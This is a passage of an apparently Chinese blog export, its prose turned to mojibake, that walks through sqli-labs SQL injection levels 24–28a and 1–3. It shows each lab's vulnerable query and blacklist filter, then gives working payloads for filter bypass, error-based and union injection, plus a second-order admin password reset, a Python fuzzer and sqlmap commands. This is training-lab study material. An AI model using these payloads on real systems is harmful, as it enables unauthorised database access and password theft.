class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; ... ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å½“æˆåŠŸç™»å½•æ—¶ï¼Œ<code>$_SESSION[&quot;username&quot;]</code>ç›´æ¥å–å‡ºä½¿ç”¨ï¼Œå¹¶æ²¡æœ‰è¿‡æ»¤ï¼Œæ‰€ä»¥è¿™é‡Œçš„<code>$username</code>æ˜¯å¯æ§å˜é‡</p>
<br>

<br>

<p>å…ˆæ³¨å†Œä¸€ä¸ª<code>admin&#39;# </code>è´¦å· éšä¾¿è®¾ç½®ä¸€ä¸ªå¯†ç <code>123456</code>ï¼Œç™»å½•åä¿®æ”¹å¯†ç ä¸º<code>12345</code></p>
<p>ä½¿ç”¨<code>admin</code> å†æ¬¡ç™»å½•å‘ç°åŸå¯†ç <code>admin</code>è¢«æ”¹æˆ<code>12345</code></p>
<br>

<h3 id="25-or-andè¢«è¿‡æ»¤"><a href="#25-or-andè¢«è¿‡æ»¤" class="headerlink" title="25 or andè¢«è¿‡æ»¤"></a>25 <code>or</code> <code>and</code>è¢«è¿‡æ»¤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®å›¾ç‰‡æç¤ºï¼Œ<code>or</code>å’Œ<code>and</code>è¢«è¿‡æ»¤äº†  ä½¿ç”¨<code>&#39;</code>é—­åˆ</p>
<p><code>?id=1&#39; --+</code></p>
<p><code>?id=1.99&#39; aandnd 1=1 union select 1,2,3%20 --+</code> 2,3ä¸ºè¾“å‡ºç‚¹</p>
<p>æˆ–è€… <code>?id=1.99&#39; aandnd 1=1 union select 1,2,3%20 anandd &#39;1&#39;=&#39;1</code></p>
<p>è™½ç„¶è¢«è¿‡æ»¤æ‰äº†ï¼Œä½†å¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡</p>
<br>

<h3 id="25a-or-andè¢«è¿‡æ»¤"><a href="#25a-or-andè¢«è¿‡æ»¤" class="headerlink" title="25a or andè¢«è¿‡æ»¤"></a>25a <code>or</code> <code>and</code>è¢«è¿‡æ»¤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<p>å’Œ25ç›¸æ¯” å°‘äº†<code>&#39;</code></p>
<p><code>?id=1 oorrder by 3</code></p>
<p><code>?id=0 union select 1,database(),3</code></p>
<br>

<h3 id="26-or-and-ç©ºæ ¼å’Œæ–œæ è¢«è¿‡æ»¤"><a href="#26-or-and-ç©ºæ ¼å’Œæ–œæ è¢«è¿‡æ»¤" class="headerlink" title="26 or/and/*/-/#/ç©ºæ ¼å’Œæ–œæ è¢«è¿‡æ»¤"></a>26 <code>or/and/*/-/#/ç©ºæ ¼</code>å’Œæ–œæ è¢«è¿‡æ»¤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> slashes</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changeToHex</span>(<span class="params">num</span>):</span><br><span class="line">    tmp = <span class="built_in">hex</span>(i).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tmp)&lt;<span class="number">2</span>:</span><br><span class="line">        tmp = <span class="string">&#x27;0&#x27;</span> + tmp</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;%&quot;</span> + tmp</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    i = changeToHex(i) </span><br><span class="line">    url = <span class="string">&quot;http://localhost/sqli-labs/Less-26/?id=1&#x27;&quot;</span> + i + <span class="string">&quot;%26%26&quot;</span> + i + <span class="string">&quot;&#x27;1&#x27;=&#x27;1&quot;</span>     </span><br><span class="line">    ret = req.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Dumb&#x27;</span> <span class="keyword">in</span> ret.content:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;good,this can use:&quot;</span> + i</span><br><span class="line">        </span><br><span class="line"><span class="comment">#good,this can use:%09</span></span><br><span class="line"><span class="comment">#good,this can use:%0a</span></span><br><span class="line"><span class="comment">#good,this can use:%0b</span></span><br><span class="line"><span class="comment">#good,this can use:%0c</span></span><br><span class="line"><span class="comment">#good,this can use:%0d</span></span><br><span class="line"><span class="comment">#good,this can use:%20</span></span><br><span class="line"><span class="comment">#good,this can use:%22</span></span><br><span class="line"><span class="comment">#good,this can use:%23</span></span><br><span class="line"><span class="comment">#good,this can use:%27</span></span><br><span class="line"><span class="comment">#good,this can use:%2a</span></span><br><span class="line"><span class="comment">#good,this can use:%2d</span></span><br><span class="line"><span class="comment">#good,this can use:%2f</span></span><br><span class="line"><span class="comment">#good,this can use:%5c</span></span><br></pre></td></tr></table></figure>

<p><code>%20(ç©ºæ ¼)ã€%23(#)ã€%2a(*)ã€%2d(-)ã€%2f(/)ã€%5c(\)ï¼Œ%09-%0déƒ½æ˜¯åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ã€æ¢é¡µç¬¦</code></p>
<p>ä½†æ˜¯è¿™ä¸ªé¢˜åœ¨linuxç¯å¢ƒä¸‹å¯ä»¥è§£æ<code>%a0</code>windowsä¸‹å°±æ— æ³•è§£æ</p>
<p>è¿™ä¸€å…³æœ‰ä¸‰ç§æ³¨å…¥æ–¹å¼:</p>
<ul>
<li>union select è”åˆæ³¨å…¥ï¼Œç”¨ç‰¹æ®Šç¼–ç ç¬¦ä»£æ›¿ç©ºæ ¼</li>
<li>æŠ¥é”™æ³¨å…¥ï¼Œä¸ºäº†é¿å¼€ç©ºæ ¼ï¼Œé€‰æ‹©ä½¿ç”¨<code>updatexml()</code>å’Œ<code>extractvalue()</code></li>
<li>Boolç›²æ³¨ï¼Œæ„é€ é¿å¼€ç©ºæ ¼çš„è¯­å¥</li>
</ul>
<p>ä½¿ç”¨<code>||</code>æ›¿æ¢<code>and</code></p>
<p><code>?id=1&#39;||&#39;1&#39;=&#39;1</code></p>
<p><code>?id=0&#39;||updatexml(1,concat(0x7e,(database()),0x7e),1)||&#39;1&#39;=&#39;1</code></p>
<p><code>?id=0&#39;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#39;security&#39;)),0x7e),1)||&#39;1&#39;=&#39;1</code></p>
<br>

<h3 id="26a-or-and-ç©ºæ ¼å’Œæ–œæ è¢«è¿‡æ»¤"><a href="#26a-or-and-ç©ºæ ¼å’Œæ–œæ è¢«è¿‡æ»¤" class="headerlink" title="26a  or/and/*/-/#/ç©ºæ ¼å’Œæ–œæ è¢«è¿‡æ»¤"></a>26a  <code>or/and/*/-/#/ç©ºæ ¼</code>å’Œæ–œæ è¢«è¿‡æ»¤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> slashes</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>?id=1&#39;)||(&#39;1&#39;=&#39;1</code></p>
<br>

<br>

<h3 id="27-ç©ºæ ¼-union-selectè¢«è¿‡æ»¤"><a href="#27-ç©ºæ ¼-union-selectè¢«è¿‡æ»¤" class="headerlink" title="27 */-/#/ç©ºæ ¼/*/union/selectè¢«è¿‡æ»¤"></a>27 <code>*/-/#/ç©ºæ ¼/*/union/select</code>è¢«è¿‡æ»¤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">select</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">UNION</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">SELECT</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">Union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>?id=0%27%a0unIon%a0sElect%a01,2,%273</code></p>
<p><code>?id=0%27%a0unIon%a0sElect%a01,(sElect%a0group_concat(password)from%a0users)%20,%273</code></p>
<br>

<br>

<h3 id="27a-ç©ºæ ¼-union-selectè¢«è¿‡æ»¤"><a href="#27a-ç©ºæ ¼-union-selectè¢«è¿‡æ»¤" class="headerlink" title="27a */-/#/ç©ºæ ¼/*/union/selectè¢«è¿‡æ»¤"></a>27a <code>*/-/#/ç©ºæ ¼/*/union/select</code>è¢«è¿‡æ»¤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">select</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">UNION</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">SELECT</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">Union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">Select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>?id=1&quot; ||&quot;1&quot;=&quot;1</code> åŒå¼•å·é—­åˆ</p>
<p><code>?id=0%22%20UnIon%a0SeLect%a01,2,3%22</code></p>
<p><code>?id=0%22%20UnIon%a0SeLect%a01,(SeLect%a0group_concat(password)from%a0users),3%22</code></p>
<br>

<h3 id="28-ç©ºæ ¼-union-selectè¢«è¿‡æ»¤"><a href="#28-ç©ºæ ¼-union-selectè¢«è¿‡æ»¤" class="headerlink" title="28*/-/#/+/ç©ºæ ¼/union/selectè¢«è¿‡æ»¤"></a>28<code>*/-/#/+/ç©ºæ ¼/union/select</code>è¢«è¿‡æ»¤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);					<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	   		 	<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">UNION</span> <span class="operator">&amp;</span> SELECT.</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<p><code>id=0%27)%a0UnIon%a0SEleCt%a01,2,(%273</code></p>
<br>

<h3 id="28a-ç©ºæ ¼-union-selectè¢«è¿‡æ»¤"><a href="#28a-ç©ºæ ¼-union-selectè¢«è¿‡æ»¤" class="headerlink" title="28a */-/#/+/ç©ºæ ¼/union/selectè¢«è¿‡æ»¤"></a>28a <code>*/-/#/+/ç©ºæ ¼/union/select</code>è¢«è¿‡æ»¤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);					<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	   		 	<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>id=0%27)%a0UnIon%a0SEleCt%a01,2,(%273</code></p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs1</title>
    <url>/posts/2b9109b5/</url>
    <content><![CDATA[<p><code>union select 1,2,table_name from information_schema.tables where table_schema = database() limit 0,1 </code>æŸ¥å­—æ®µ</p>
<p><code>union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;è¡¨å&#39; limit 0,1</code></p>
<h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>ç”¨<code>&#39;</code>é—­åˆ</p>
<p><code>id = 1&#39; --+</code></p>
<p><code>id =1&#39; order by 4 --+</code> #æŠ¥é”™ è¯´æ˜æœ‰ä¸‰ä¸ªå­—æ®µ</p>
<p><code>id = 1.9999&#39; and union select 1,2,3  --+ </code>  2,3æ˜¯è¾“å‡ºç‚¹</p>
<p><code>id=1.9999&#39; and union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1 --+</code>æŸ¥è¡¨å</p>
<p><code>id=-1&#39; union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 1,1--+</code> æŸ¥å­—æ®µ</p>
<p><code>?id=-1&#39; union select 1,username,password from users limit 1,1--+</code> æŸ¥è´¦å·å¯†ç </p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --dbs --batch --tables</code></p>
<p>åŠ äº†<code>--batch</code> sqlmapä¸ä¼šè¯¢é—®ä½ è¾“å…¥ å…¨éƒ¨é»˜è®¤ç¡®å®š</p>
<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<br>

<p><code>id=1 and 1=1 union select 1,2, table_name from information_schema.tables where table_schema=database() limit 1,1 --+</code> æŸ¥è¡¨å</p>
<p><code>id=1 and 1=1 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1--+</code> æŸ¥å­—æ®µ</p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-2/?id=1&quot; --dbs --batch --tables</code></p>
<br>

<br>

<h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>ç”¨<code>&#39;)</code>é—­åˆ</p>
<p><code>id=1&#39;) and 1=1 --+</code></p>
<p><code>id=1.999&#39;)  and 1=1 union select 1,2,table_name from information_schema.tables where table_schema=database() limit 1,1 --+</code></p>
<p><code>id=1.999&#39;)  and 1=1 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1 --+</code></p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-3/?id=1&quot; --dbs --batch</code></p>
<br>

